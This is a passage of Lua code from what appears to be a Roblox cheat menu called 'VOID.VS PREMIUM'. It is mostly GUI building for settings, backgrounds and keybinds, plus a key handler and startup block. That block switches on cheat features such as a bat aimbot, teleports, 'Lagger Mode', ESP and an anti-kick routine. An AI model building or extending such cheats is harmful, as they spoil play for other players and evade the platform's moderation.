    animBtn.TextColor3=C.white; animBtn.TextSize=9; animBtn.Font=Enum.Font.GothamBold; guiCorner(animBtn,5)
    animBtn.MouseButton1Click:Connect(function()
        animIdx=animIdx%#ANIM_PACK_ORDER+1
        animPackName=ANIM_PACK_ORDER[animIdx]
        animVal.Text=animPackName
        animPackEnabled=(animPackName~="OFF")
        applyAnimPack(animPackName)
        saveConfig()
    end)
    addToggleRow(vi,"Anim Pack Enabled",animPackEnabled,9,nil,function(on)
        animPackEnabled=on
        if on then applyAnimPack(animPackName) else resetAnimPack(LP.Character) end
        saveConfig()
    end)
    addSectLbl(vi,"SKY THEME",8)
    local skyIdx=1; for i,t in ipairs(SkyOrder) do if t==currentSkyTheme then skyIdx=i; break end end
    local skyRow=Instance.new("Frame"); skyRow.Size=UDim2.new(1,0,0,38); skyRow.BackgroundColor3=C.row
    skyRow.BackgroundTransparency=0.5; skyRow.BorderSizePixel=0; skyRow.LayoutOrder=9; skyRow.Parent=vi
    guiCorner(skyRow,10); guiStroke(skyRow,C.divider,1)
    local skyLbl=Instance.new("TextLabel",skyRow); skyLbl.Size=UDim2.new(0.45,0,0,16); skyLbl.Position=UDim2.new(0,12,0,6)
    skyLbl.BackgroundTransparency=1; skyLbl.Text="Sky Theme"; skyLbl.TextColor3=C.text; skyLbl.TextSize=11; skyLbl.Font=Enum.Font.GothamBold; skyLbl.TextXAlignment=Enum.TextXAlignment.Left
    local skyVal=Instance.new("TextLabel",skyRow); skyVal.Size=UDim2.new(0,80,0,16); skyVal.Position=UDim2.new(1,-130,0,6)
    skyVal.BackgroundTransparency=1; skyVal.Text=currentSkyTheme; skyVal.TextColor3=C.textDim; skyVal.TextSize=9; skyVal.Font=Enum.Font.GothamBold; skyVal.TextXAlignment=Enum.TextXAlignment.Right
    local skyBtn=Instance.new("TextButton",skyRow); skyBtn.Size=UDim2.new(0,44,0,22); skyBtn.Position=UDim2.new(1,-52,0.5,-11)
    skyBtn.BackgroundColor3=C.blue; skyBtn.BackgroundTransparency=0.5; skyBtn.BorderSizePixel=0; skyBtn.Text="Next"
    skyBtn.TextColor3=C.white; skyBtn.TextSize=9; skyBtn.Font=Enum.Font.GothamBold; guiCorner(skyBtn,5)
    skyBtn.MouseButton1Click:Connect(function()
        skyIdx=skyIdx%#SkyOrder+1; currentSkyTheme=SkyOrder[skyIdx]; skyVal.Text=currentSkyTheme
        CandyApplyCustomSky(currentSkyTheme); saveConfig()
    end)
    local hov2=Instance.new("TextButton",skyRow); hov2.Size=UDim2.new(1,0,1,0); hov2.BackgroundTransparency=1; hov2.Text=""; hov2.ZIndex=0
    hov2.MouseEnter:Connect(function() tw(skyRow,{BackgroundTransparency=0.3}) end)
    hov2.MouseLeave:Connect(function() tw(skyRow,{BackgroundTransparency=0.5}) end)
    addSectLbl(vi,"FOV",10)
    local fovRow=Instance.new("Frame"); fovRow.Size=UDim2.new(1,0,0,38); fovRow.BackgroundColor3=C.row
    fovRow.BackgroundTransparency=0.5; fovRow.BorderSizePixel=0; fovRow.LayoutOrder=11; fovRow.Parent=vi
    guiCorner(fovRow,10); guiStroke(fovRow,C.divider,1)
    local fovLbl=Instance.new("TextLabel",fovRow); fovLbl.Size=UDim2.new(0.5,0,0,16); fovLbl.Position=UDim2.new(0,12,0,6)
    fovLbl.BackgroundTransparency=1; fovLbl.Text="FOV"; fovLbl.TextColor3=C.text; fovLbl.TextSize=11; fovLbl.Font=Enum.Font.GothamBold; fovLbl.TextXAlignment=Enum.TextXAlignment.Left
    local fovBtn=Instance.new("TextButton",fovRow); fovBtn.Size=UDim2.new(0,52,0,22); fovBtn.Position=UDim2.new(1,-60,0.5,-11)
    fovBtn.BackgroundColor3=C.blue; fovBtn.BackgroundTransparency=0.5; fovBtn.BorderSizePixel=0
    fovBtn.Text=tostring(fovValue); fovBtn.TextColor3=C.white; fovBtn.TextSize=11; fovBtn.Font=Enum.Font.GothamBold; guiCorner(fovBtn,5)
    fovBtn.MouseButton1Click:Connect(function()
        fovIndex=fovIndex%#fovOptions+1; fovValue=fovOptions[fovIndex]; fovBtn.Text=tostring(fovValue); applyFOV(); saveConfig()
    end)
    local hov3=Instance.new("TextButton",fovRow); hov3.Size=UDim2.new(1,0,1,0); hov3.BackgroundTransparency=1; hov3.Text=""; hov3.ZIndex=0
    hov3.MouseEnter:Connect(function() tw(fovRow,{BackgroundTransparency=0.3}) end)
    hov3.MouseLeave:Connect(function() tw(fovRow,{BackgroundTransparency=0.5}) end)
    addSectLbl(vi,"UI SCALE",17)
    local function makePlusMinusRow(parent,label,order,getVal,setVal,fmt,step,minV,maxV)
        local row=Instance.new("Frame"); row.Size=UDim2.new(1,0,0,38); row.BackgroundColor3=C.row
        row.BackgroundTransparency=0.5; row.BorderSizePixel=0; row.LayoutOrder=order; row.Parent=parent
        guiCorner(row,10); guiStroke(row,C.divider,1)
        local lbl=Instance.new("TextLabel",row); lbl.Size=UDim2.new(0.42,0,0,16); lbl.Position=UDim2.new(0,12,0,6)
        lbl.BackgroundTransparency=1; lbl.Text=label; lbl.TextColor3=C.text; lbl.TextSize=11; lbl.Font=Enum.Font.GothamBold; lbl.TextXAlignment=Enum.TextXAlignment.Left
        local minusBtn=Instance.new("TextButton",row); minusBtn.Size=UDim2.new(0,28,0,22); minusBtn.Position=UDim2.new(1,-100,0.5,-11)
        minusBtn.BackgroundColor3=C.blue; minusBtn.BackgroundTransparency=0.5; minusBtn.BorderSizePixel=0
        minusBtn.Text="-"; minusBtn.TextColor3=C.white; minusBtn.TextSize=14; minusBtn.Font=Enum.Font.GothamBold; guiCorner(minusBtn,5)
        local valLbl=Instance.new("TextLabel",row); valLbl.Size=UDim2.new(0,40,0,22); valLbl.Position=UDim2.new(1,-70,0.5,-11)
        valLbl.BackgroundTransparency=1; valLbl.Text=fmt(getVal()); valLbl.TextColor3=C.text; valLbl.TextSize=11; valLbl.Font=Enum.Font.GothamBold; valLbl.TextXAlignment=Enum.TextXAlignment.Center
        local plusBtn=Instance.new("TextButton",row); plusBtn.Size=UDim2.new(0,28,0,22); plusBtn.Position=UDim2.new(1,-28,0.5,-11)
        plusBtn.BackgroundColor3=C.blue; plusBtn.BackgroundTransparency=0.5; plusBtn.BorderSizePixel=0
        plusBtn.Text="+"; plusBtn.TextColor3=C.white; plusBtn.TextSize=14; plusBtn.Font=Enum.Font.GothamBold; guiCorner(plusBtn,5)
        local function apply(delta)
            local v=math.clamp(getVal()+delta,minV,maxV)
            setVal(v)
            valLbl.Text=fmt(v)
            saveConfig()
        end
        minusBtn.MouseButton1Click:Connect(function() apply(-step) end)
        plusBtn.MouseButton1Click:Connect(function() apply(step) end)
        local hov=Instance.new("TextButton",row); hov.Size=UDim2.new(1,0,1,0); hov.BackgroundTransparency=1; hov.Text=""; hov.ZIndex=0
        hov.MouseEnter:Connect(function() tw(row,{BackgroundTransparency=0.3}) end)
        hov.MouseLeave:Connect(function() tw(row,{BackgroundTransparency=0.5}) end)
        return valLbl
    end

    local uiScaleVal = (GuiRefs.outerScale and GuiRefs.outerScale.Scale) or 0.70
    makePlusMinusRow(vi,"UI Scale",18,
        function() return uiScaleVal end,
        function(v)
            uiScaleVal=v
            if GuiRefs.outerScale then GuiRefs.outerScale.Scale=v end
        end,
        function(v) return string.format("%.2f",v) end,
        0.05, 0.50, 1.30
    )

    makePlusMinusRow(vi,"Mobile Buttons Size",19,
        function() return tonumber(mobileButtonsSize) or 80 end,
        function(v)
            mobileButtonsSize=math.floor(v+0.5)
            if mobileButtonsEnabled and buildMobileButtons then
                buildMobileButtons()
            end
        end,
        function(v) return tostring(math.floor(v+0.5)) end,
        10, 50, 140
    )

    addToggleRow(vi,"Show Mobile Buttons",mobileButtonsEnabled,20,nil,function(on)
        mobileButtonsEnabled = on
        if on then
            if buildMobileButtons then buildMobileButtons() end
        else
            if destroyMobileButtons then destroyMobileButtons() end
        end
        saveConfig()
    end)
    addToggleRow(vi,"Show Discord Link",discordLinkEnabled,21,nil,function(on)
        discordLinkEnabled = on
        if on then
            if buildDiscordLink then buildDiscordLink() end
        else
            if destroyDiscordLink then destroyDiscordLink() end
        end
        saveConfig()
    end)
    addToggleRow(vi,"Show Circle Logo",logoCircleEnabled,22,nil,function(on)
        logoCircleEnabled = on == true
        if logoCircleRef then
            logoCircleRef.Visible = logoCircleEnabled
        elseif GuiRefs.logoCircle then
            GuiRefs.logoCircle.Visible = logoCircleEnabled
        end
        -- shift title when logo hidden
        pcall(function()
            local hf = GuiRefs.inner and GuiRefs.inner:FindFirstChild("HeaderFrame", true)
            if not hf and GuiRefs.chromeGroup then
                hf = GuiRefs.chromeGroup:FindFirstChild("HeaderFrame", true)
            end
            if hf then
                local tl = hf:FindFirstChild("TextLabel") or hf:FindFirstChildWhichIsA("TextLabel")
                -- find VOID.VS title by text
                for _, d in ipairs(hf:GetChildren()) do
                    if d:IsA("TextLabel") and d.Text == "VOID.VS" then
                        d.Position = logoCircleEnabled and UDim2.new(0,60,0,8) or UDim2.new(0,14,0,8)
                    elseif d:IsA("TextLabel") and d.Text:find("PREMIUM") then
                        d.Position = logoCircleEnabled and UDim2.new(0,60,0,32) or UDim2.new(0,14,0,32)
                    end
                end
            end
        end)
        saveConfig()
    end)

    addToggleRow(vi,"Lock All (freeze everything)",uiLocked,16,nil,function(on) uiLocked=on; saveConfig() end)
    addSectLbl(vi,"RESET",14)
    local resetRow=Instance.new("Frame"); resetRow.Size=UDim2.new(1,0,0,38); resetRow.BackgroundColor3=C.row
    resetRow.BackgroundTransparency=0.5; resetRow.BorderSizePixel=0; resetRow.LayoutOrder=15; resetRow.Parent=vi
    guiCorner(resetRow,10); guiStroke(resetRow,C.divider,1)
    local resetLbl=Instance.new("TextLabel",resetRow); resetLbl.Size=UDim2.new(0.55,0,0,16); resetLbl.Position=UDim2.new(0,12,0,6)
    resetLbl.BackgroundTransparency=1; resetLbl.Text="Reset Settings"; resetLbl.TextColor3=C.text; resetLbl.TextSize=11; resetLbl.Font=Enum.Font.GothamBold; resetLbl.TextXAlignment=Enum.TextXAlignment.Left
    local resetBtn=Instance.new("TextButton",resetRow); resetBtn.Size=UDim2.new(0,52,0,22); resetBtn.Position=UDim2.new(1,-60,0.5,-11)
    resetBtn.BackgroundColor3=Color3.fromRGB(150,30,40); resetBtn.BackgroundTransparency=0.2; resetBtn.BorderSizePixel=0
    resetBtn.Text="RESET"; resetBtn.TextColor3=C.white; resetBtn.TextSize=9; resetBtn.Font=Enum.Font.GothamBold; guiCorner(resetBtn,5)
    resetBtn.MouseButton1Click:Connect(function() resetAllSettings() end)
    local hov4=Instance.new("TextButton",resetRow); hov4.Size=UDim2.new(1,0,1,0); hov4.BackgroundTransparency=1; hov4.Text=""; hov4.ZIndex=0
    hov4.MouseEnter:Connect(function() tw(resetRow,{BackgroundTransparency=0.3}) end)
    hov4.MouseLeave:Connect(function() tw(resetRow,{BackgroundTransparency=0.5}) end)
end)()


-- BACKGROUND PAGE (Background List with big previews + scroller)
;(function()
    local bgPage = CategoryRefs.contents["Background"]
    if not bgPage then return end
    addSectLbl(bgPage, "BACKGROUND LIST", 0)

    local listFrame = Instance.new("Frame")
    listFrame.Size = UDim2.new(1, 0, 0, 420)
    listFrame.BackgroundColor3 = C.row
    listFrame.BackgroundTransparency = 0.55
    listFrame.BorderSizePixel = 0
    listFrame.LayoutOrder = 1
    listFrame.Parent = bgPage
    guiCorner(listFrame, 12)
    guiStroke(listFrame, C.divider, 1)

    local title = Instance.new("TextLabel", listFrame)
    title.Size = UDim2.new(1, -16, 0, 22)
    title.Position = UDim2.new(0, 8, 0, 6)
    title.BackgroundTransparency = 1
    title.Text = "Background List  ·  tap a preview"
    title.TextColor3 = C.textDim
    title.TextSize = 11
    title.Font = Enum.Font.GothamBold
    title.TextXAlignment = Enum.TextXAlignment.Left

    local scroll = Instance.new("ScrollingFrame", listFrame)
    scroll.Name = "BackgroundList"
    scroll.Size = UDim2.new(1, -12, 1, -36)
    scroll.Position = UDim2.new(0, 6, 0, 30)
    scroll.BackgroundTransparency = 1
    scroll.BorderSizePixel = 0
    scroll.ScrollBarThickness = 6
    scroll.ScrollBarImageColor3 = C.blue
    scroll.ScrollingDirection = Enum.ScrollingDirection.Y
    scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
    scroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
    scroll.ElasticBehavior = Enum.ElasticBehavior.Always
    scroll.ZIndex = 5

    local lay = Instance.new("UIListLayout", scroll)
    lay.SortOrder = Enum.SortOrder.LayoutOrder
    lay.Padding = UDim.new(0, 10)
    local pad = Instance.new("UIPadding", scroll)
    pad.PaddingTop = UDim.new(0, 4)
    pad.PaddingBottom = UDim.new(0, 16)
    pad.PaddingLeft = UDim.new(0, 4)
    pad.PaddingRight = UDim.new(0, 4)

    local cardRefs = {}

    local function setSelectedVisual(sel)
        for i, rec in ipairs(cardRefs) do
            if rec.stroke then
                rec.stroke.Color = (i == sel) and Color3.fromRGB(255,255,255) or Color3.fromRGB(60,60,70)
                rec.stroke.Thickness = (i == sel) and 2 or 1
            end
            if rec.badge then
                rec.badge.Visible = (i == sel)
            end
        end
        if cardRefs[0] then
            cardRefs[0].stroke.Color = (sel == 0) and Color3.fromRGB(255,255,255) or Color3.fromRGB(60,60,70)
            if cardRefs[0].badge then cardRefs[0].badge.Visible = (sel == 0) end
        end
    end

    -- OFF card
    do
        local card = Instance.new("TextButton", scroll)
        card.Size = UDim2.new(1, -8, 0, 56)
        card.BackgroundColor3 = Color3.fromRGB(18,18,22)
        card.BorderSizePixel = 0
        card.AutoButtonColor = false
        card.Text = ""
        card.LayoutOrder = 0
        card.ZIndex = 6
        guiCorner(card, 10)
        local st = guiStroke(card, Color3.fromRGB(60,60,70), 1)
        local lbl = Instance.new("TextLabel", card)
        lbl.Size = UDim2.new(1, -20, 1, 0)
        lbl.Position = UDim2.new(0, 14, 0, 0)
        lbl.BackgroundTransparency = 1
        lbl.Text = "OFF  ·  No background"
        lbl.TextColor3 = C.text
        lbl.TextSize = 13
        lbl.Font = Enum.Font.GothamBold
        lbl.TextXAlignment = Enum.TextXAlignment.Left
        lbl.ZIndex = 7
        local badge = Instance.new("TextLabel", card)
        badge.Size = UDim2.new(0, 64, 0, 20)
        badge.Position = UDim2.new(1, -74, 0.5, -10)
        badge.BackgroundColor3 = Color3.fromRGB(40,40,48)
        badge.Text = "ACTIVE"
        badge.TextColor3 = Color3.fromRGB(255,255,255)
        badge.TextSize = 9
        badge.Font = Enum.Font.GothamBold
        badge.ZIndex = 8
        badge.Visible = (backgroundIndex == 0)
        guiCorner(badge, 6)
        cardRefs[0] = {stroke = st, badge = badge}
        card.MouseButton1Click:Connect(function()
            applyBackgroundImage(0)
            setSelectedVisual(0)
            saveConfig()
        end)
    end

    for idx, entry in ipairs(BG_IMAGE_URLS) do
        local card = Instance.new("ImageButton", scroll)
        card.Size = UDim2.new(1, -8, 0, 130)
        card.BackgroundColor3 = Color3.fromRGB(12,12,16)
        card.BackgroundTransparency = 0.05
        card.Image = ""
        card.ScaleType = Enum.ScaleType.Crop
        card.BorderSizePixel = 0
        card.AutoButtonColor = false
        card.LayoutOrder = idx
        card.ZIndex = 6
        guiCorner(card, 12)
        local st = guiStroke(card, Color3.fromRGB(60,60,70), 1)

        local dim = Instance.new("Frame", card)
        dim.Size = UDim2.new(1, 0, 0, 32)
        dim.Position = UDim2.new(0, 0, 1, -32)
        dim.BackgroundColor3 = Color3.fromRGB(0,0,0)
        dim.BackgroundTransparency = 0.35
        dim.BorderSizePixel = 0
        dim.ZIndex = 7
        guiCorner(dim, 12)

        local nameLbl = Instance.new("TextLabel", card)
        nameLbl.Size = UDim2.new(1, -90, 0, 22)
        nameLbl.Position = UDim2.new(0, 12, 1, -28)
        nameLbl.BackgroundTransparency = 1
        nameLbl.Text = "Background " .. tostring(idx)
        nameLbl.TextColor3 = Color3.fromRGB(240,240,245)
        nameLbl.TextSize = 12
        nameLbl.Font = Enum.Font.GothamBold
        nameLbl.TextXAlignment = Enum.TextXAlignment.Left
        nameLbl.ZIndex = 8

        local badge = Instance.new("TextLabel", card)
        badge.Size = UDim2.new(0, 64, 0, 20)
        badge.Position = UDim2.new(1, -74, 1, -26)
        badge.BackgroundColor3 = Color3.fromRGB(40,40,48)
        badge.Text = "ACTIVE"
        badge.TextColor3 = Color3.fromRGB(255,255,255)
        badge.TextSize = 9
        badge.Font = Enum.Font.GothamBold
        badge.ZIndex = 8
        badge.Visible = (backgroundIndex == idx)
        guiCorner(badge, 6)

        cardRefs[idx] = {stroke = st, badge = badge, img = card}

        task.spawn(function()
            for _try = 1, 25 do
                local asset = bgLoadedAssets[idx]
                if asset and asset ~= "" then
                    card.Image = asset
                    break
                end
                if _try == 3 then
                    local a = downloadBgImage(entry)
                    if a ~= "" then
                        bgLoadedAssets[idx] = a
                        card.Image = a
                        break
                    end
                end
                task.wait(0.12)
            end
            if card.Image == "" then card.Image = entry.url end
        end)

        card.MouseButton1Click:Connect(function()
            applyBackgroundImage(idx)
            setSelectedVisual(idx)
            saveConfig()
        end)
    end

    task.defer(function()
        setSelectedVisual(backgroundIndex or 0)
        if backgroundIndex and backgroundIndex > 0 then
            applyBackgroundImage(backgroundIndex)
        end
    end)
end)()

-- KEYBINDS PAGE (exact K7 style: label + dual PC/Gamepad bind button)
;(function()
    local kb=CategoryRefs.contents["Keybinds"]
    local GAMEPAD_KEYS={
        [Enum.KeyCode.ButtonA]=true,[Enum.KeyCode.ButtonB]=true,[Enum.KeyCode.ButtonX]=true,[Enum.KeyCode.ButtonY]=true,
        [Enum.KeyCode.ButtonL1]=true,[Enum.KeyCode.ButtonR1]=true,[Enum.KeyCode.ButtonL2]=true,[Enum.KeyCode.ButtonR2]=true,
        [Enum.KeyCode.ButtonL3]=true,[Enum.KeyCode.ButtonR3]=true,[Enum.KeyCode.ButtonStart]=true,[Enum.KeyCode.ButtonSelect]=true,
        [Enum.KeyCode.DPadUp]=true,[Enum.KeyCode.DPadDown]=true,[Enum.KeyCode.DPadLeft]=true,[Enum.KeyCode.DPadRight]=true,
    }
    local function isGamepadInput(inp)
        return inp and inp.UserInputType and tostring(inp.UserInputType.Name):match("^Gamepad")~=nil
    end
    local function isBindableInput(inp)
        if not inp or inp.KeyCode==Enum.KeyCode.Unknown then return false end
        if inp.UserInputType==Enum.UserInputType.Keyboard then return true end
        return isGamepadInput(inp) and GAMEPAD_KEYS[inp.KeyCode]==true
    end
    local function formatKeybindText(entry)
        if not entry then return "..." end
        local parts={}
        if entry.kb then table.insert(parts, entry.kb.Name) end
        if entry.gp then table.insert(parts, entry.gp.Name) end
        if #parts==0 then return "..." end
        return table.concat(parts, " / ")
    end
    local _anyKeyListening=false
    local function mkKBRow(parent, txt, kbEntry, order)
        local row=Instance.new("Frame",parent)
        row.Size=UDim2.new(1,0,0,38)
        row.BackgroundColor3=C.row
        row.BackgroundTransparency=0.5
        row.BorderSizePixel=0
        row.LayoutOrder=order or 0
        guiCorner(row,10); guiStroke(row,C.divider,1)
        local lbl=Instance.new("TextLabel",row)
        lbl.Size=UDim2.new(1,-110,1,0); lbl.Position=UDim2.new(0,12,0,0)
        lbl.BackgroundTransparency=1; lbl.Text=txt
        lbl.TextColor3=C.text; lbl.TextSize=11; lbl.Font=Enum.Font.GothamBold
        lbl.TextXAlignment=Enum.TextXAlignment.Left
        local function getLabel() return formatKeybindText(kbEntry) end
        local btn=Instance.new("TextButton",row)
        btn.Size=UDim2.new(0,96,0,24); btn.Position=UDim2.new(1,-104,0.5,-12)
        btn.BackgroundColor3=C.input or C.blueDark or Color3.fromRGB(16,16,16)
        btn.BorderSizePixel=0; btn.AutoButtonColor=false; btn.ZIndex=5
        btn.Text=getLabel(); btn.TextColor3=C.white; btn.TextSize=10
        btn.Font=Enum.Font.GothamMedium; btn.TextTruncate=Enum.TextTruncate.AtEnd
        guiCorner(btn,6); guiStroke(btn,C.divider,1)
        local listening=false; local conn=nil; local listenStart=0
        btn.MouseButton1Click:Connect(function()
            if listening then
                listening=false; _anyKeyListening=false
                if conn then conn:Disconnect(); conn=nil end
                btn.Text=getLabel(); btn.TextColor3=C.white
                return
            end
            listening=true; _anyKeyListening=true; listenStart=tick()
            btn.Text="Press key..."; btn.TextColor3=Color3.fromRGB(255,200,220)
            conn=UIS.InputBegan:Connect(function(inp)
                if not listening then return end
                if inp.KeyCode==Enum.KeyCode.Escape then
                    listening=false; _anyKeyListening=false
                    if conn then conn:Disconnect(); conn=nil end
                    btn.Text=getLabel(); btn.TextColor3=C.white
                    return
                end
                local isGp=isGamepadInput(inp)
                if isGp and (tick()-listenStart)<0.15 then return end
                if not isBindableInput(inp) then return end
                if isGp then kbEntry.gp=inp.KeyCode else kbEntry.kb=inp.KeyCode end
                -- mirror into Keys for legacy handler
                if txt=="Hide GUI" then Keys.guiHide=kbEntry.kb or Keys.guiHide end
                if txt=="Carry Speed" then Keys.carryMode=kbEntry.kb or Keys.carryMode end
                if txt=="Lagger Mode" then Keys.laggerToggle=kbEntry.kb or Keys.laggerToggle end
                if txt=="Lagger Carry" then Keys.laggerCarry=kbEntry.kb or Keys.laggerCarry end
                if txt=="Auto Bat" then Keys.circle=kbEntry.kb or Keys.circle end
                if txt=="TP Bat" then Keys.tpBat=kbEntry.kb or Keys.tpBat end
                if txt=="Auto Left" then Keys.autoLeft=kbEntry.kb or Keys.autoLeft end
                if txt=="Auto Right" then Keys.autoRight=kbEntry.kb or Keys.autoRight end
                if txt=="Drop Brainrot" then Keys.dropBrainrot=kbEntry.kb or Keys.dropBrainrot end
                if txt=="TP Down" then Keys.tpDown=kbEntry.kb or Keys.tpDown end
                if txt=="BAT V2" then Keys.batV2=kbEntry.kb or Keys.batV2 end
                listening=false; _anyKeyListening=false
                if conn then conn:Disconnect(); conn=nil end
                btn.Text=getLabel(); btn.TextColor3=C.white
                pcall(saveConfig)
            end)
        end)
        local hov=Instance.new("TextButton",row)
        hov.Size=UDim2.new(1,0,1,0); hov.BackgroundTransparency=1; hov.Text=""; hov.ZIndex=0
        hov.MouseEnter:Connect(function() tw(row,{BackgroundTransparency=0.3}) end)
        hov.MouseLeave:Connect(function() tw(row,{BackgroundTransparency=0.5}) end)
        return row
    end

    addSectLbl(kb,"Keybinds (PC + Gamepad)",0)
    mkKBRow(kb,"Hide GUI",KB.GuiHide,1)
    mkKBRow(kb,"Carry Speed",KB.SpeedToggle,2)
    mkKBRow(kb,"Lagger Mode",KB.LaggerToggle,3)
    mkKBRow(kb,"Lagger Carry",KB.LaggerCarry,4)
    mkKBRow(kb,"Auto Bat",KB.AutoBat,5)
    mkKBRow(kb,"BAT V2",KB.BatV2,5)
    mkKBRow(kb,"TP Bat",KB.TPBat,6)
    mkKBRow(kb,"Auto Left",KB.AutoLeft,7)
    mkKBRow(kb,"Auto Right",KB.AutoRight,8)
    mkKBRow(kb,"Drop Brainrot",KB.DropBrainrot,9)
    mkKBRow(kb,"TP Down",KB.TPFloor,10)
end)()

-- KEYBOARD + CONTROLLER SHORTCUTS (K7 dual-bind aware)
local function kbMatch(entry, kc)
    if not kc or kc==Enum.KeyCode.Unknown then return false end
    if not entry or type(entry)~="table" then return false end
    if entry.kb and kc==entry.kb then return true end
    if entry.gp and kc==entry.gp then return true end
    return false
end
local function isBoundKey(k)
    if not k or k==Enum.KeyCode.Unknown then return false end
    for _,entry in pairs(KB) do
        if type(entry)=="table" and (entry.kb==k or entry.gp==k) then return true end
    end
    for _,bk in pairs(Keys) do
        if bk==k then return true end
    end
    return false
end
local _bindLast = {}
local function bindReady(name)
    local t = tick()
    if (_bindLast[name] or 0) + 0.25 > t then return false end
    _bindLast[name] = t
    return true
end
UIS.InputBegan:Connect(function(inp,gp)
    if UIS:GetFocusedTextBox() then return end
    local k = inp.KeyCode
    if k==Enum.KeyCode.Unknown then return end
    if k==Enum.KeyCode.Thumbstick1 or k==Enum.KeyCode.Thumbstick2 then return end
    -- tools mark R1/L1 as gameProcessed — still fire our custom binds
    if gp and not isBoundKey(k) then return end
    if k==Keys.guiHide or kbMatch(KB.GuiHide,k) then
        if not bindReady("guiHide") then return end
        if GuiRefs.outer and GuiRefs.outer.Visible then
            if GuiRefs.hideGui then GuiRefs.hideGui() else GuiRefs.outer.Visible=false end
        else
            if GuiRefs.showGui then GuiRefs.showGui() elseif GuiRefs.outer then GuiRefs.outer.Visible=true end
        end
    elseif k==Keys.speed then speedToggleAction(); saveConfig()
    elseif k==Keys.carryMode or kbMatch(KB.SpeedToggle,k) then toggleCarryMode(); saveConfig()
    elseif k==Keys.laggerToggle or kbMatch(KB.LaggerToggle,k) then if not bindReady("laggerToggle") then return end; toggleLaggerMode(); saveConfig()
    elseif k==Keys.laggerCarry or kbMatch(KB.LaggerCarry,k) then if not bindReady("laggerCarry") then return end; toggleLaggerCarry(); saveConfig()
    elseif k==Keys.batV2 or kbMatch(KB.BatV2,k) then
        RXZ.toggleBatV2()
    elseif k==Keys.circle or kbMatch(KB.AutoBat,k) then
        autoBatEnabled=not autoBatEnabled
        if autoBatEnabled then startBatAimbot() else stopBatAimbot() end
        if autoBatSetVisual then autoBatSetVisual(autoBatEnabled) end
        if mobBtnRefs.autoBat then mobBtnRefs.autoBat(autoBatEnabled) end
        saveConfig()
    elseif k==Keys.dropBrainrot or kbMatch(KB.DropBrainrot,k) then runDrop()
    elseif k==Keys.tpDown or kbMatch(KB.TPFloor,k) then runTPFloor()
    elseif k==Keys.tpBat or kbMatch(KB.TPBat,k) then
        if RXZ.tpBat then
            RXZ.stopTPBat()
        else
            if SafeMode and SafeMode.tryStart and not SafeMode.tryStart() then
                -- blocked by safe mode
            else
                RXZ.startTPBat()
            end
        end
        if RXZ.setTPBatVisual then RXZ.setTPBatVisual(RXZ.tpBat) end
        if mobBtnRefs.tpBat then mobBtnRefs.tpBat(RXZ.tpBat) end
        saveConfig()
    elseif k==Keys.autoLeft or kbMatch(KB.AutoLeft,k) then
        if autoLeftEnabled then autoLeftEnabled=false; stopAutoLeft()
        else
            if SafeMode and SafeMode.tryStart and not SafeMode.tryStart() then
                -- blocked by safe mode
            else
                if autoRightEnabled then autoRightEnabled=false; stopAutoRight(); if autoRightSetVisual then autoRightSetVisual(false) end; if mobBtnRefs.autoRight then mobBtnRefs.autoRight(false) end end
                if autoBatEnabled then stopBatAimbot(); if autoBatSetVisual then autoBatSetVisual(false) end; if mobBtnRefs.autoBat then mobBtnRefs.autoBat(false) end end
                autoLeftEnabled=true; startAutoLeft()
            end
        end
        if autoLeftSetVisual then autoLeftSetVisual(autoLeftEnabled) end
        if mobBtnRefs.autoLeft then mobBtnRefs.autoLeft(autoLeftEnabled) end
        saveConfig()
    elseif k==Keys.autoRight or kbMatch(KB.AutoRight,k) then
        if autoRightEnabled then autoRightEnabled=false; stopAutoRight()
        else
            if SafeMode and SafeMode.tryStart and not SafeMode.tryStart() then
                -- blocked by safe mode
            else
                if autoLeftEnabled then autoLeftEnabled=false; stopAutoLeft(); if autoLeftSetVisual then autoLeftSetVisual(false) end; if mobBtnRefs.autoLeft then mobBtnRefs.autoLeft(false) end end
                if autoBatEnabled then stopBatAimbot(); if autoBatSetVisual then autoBatSetVisual(false) end; if mobBtnRefs.autoBat then mobBtnRefs.autoBat(false) end end
                autoRightEnabled=true; startAutoRight()
            end
        end
        if autoRightSetVisual then autoRightSetVisual(autoRightEnabled) end
        if mobBtnRefs.autoRight then mobBtnRefs.autoRight(autoRightEnabled) end
        saveConfig()
    end
end)

-- STARTUP
if infJumpEnabled then startHoldInfJump() end
if antiRagdollEnabled then startAntiRagdoll() end
if medusaCounterEnabled then setupMedusa(LP.Character) end
if espEnabled then startESP() end
RXZ.antiKick=true; RXZ.enableAntiKick()
CandyApplyCustomSky(currentSkyTheme)
buildMobileButtons()
if buildDiscordLink then buildDiscordLink() end

-- ============================================================
-- IDLE UI FADE (inside GUI scope) — Inner chrome fades after 5s
-- ============================================================
do
    local IDLE_SEC = 5
    local lastInteract = tick()
    local faded = false
    local tiIn = TweenInfo.new(0.55, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
    local tiOut = TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

    -- CanvasGroup wraps tabs + content for clean GroupTransparency fade
    local chromeGroup = Instance.new("CanvasGroup")
    chromeGroup.Name = "ChromeFade"
    chromeGroup.Size = UDim2.new(1, 0, 1, 0)
    chromeGroup.Position = UDim2.new(0, 0, 0, 0)
    chromeGroup.BackgroundTransparency = 1
    chromeGroup.BorderSizePixel = 0
    chromeGroup.GroupTransparency = 0
    chromeGroup.ZIndex = 2
    chromeGroup.Parent = GuiRefs.inner

    -- Re-parent header / tabs / content / seps into chrome group (bg stays on Inner)
    local inner = GuiRefs.inner
    local moveNames = {
        HeaderFrame = true,
        TabBar = true,
        ContentFrame = true,
    }
    if inner then
        local toMove = {}
        for _, ch in ipairs(inner:GetChildren()) do
            if moveNames[ch.Name] then
                table.insert(toMove, ch)
            elseif ch:IsA("Frame") and ch.Size.Y.Offset == 1 then
                table.insert(toMove, ch)
            end
        end
        for _, ch in ipairs(toMove) do
            ch.Parent = chromeGroup
        end
    end
    GuiRefs.chromeGroup = chromeGroup

    -- Title image stays outside Inner fade (never gets GroupTransparency)
    pcall(function()
        local title = GuiRefs.voidTitle
        local outer = GuiRefs.outer
        if title and outer then
            title.Parent = outer
            title.ZIndex = 50
            title.AnchorPoint = Vector2.new(0.5, 0)
            title.Position = UDim2.new(0.5, 0, 0, -8)
            title.Size = UDim2.new(0, 300, 0, 150)
            title.BackgroundTransparency = 1
            -- keep title locked to outer top while menu moves
            if not title:GetAttribute("VoidTitlePinned") then
                title:SetAttribute("VoidTitlePinned", true)
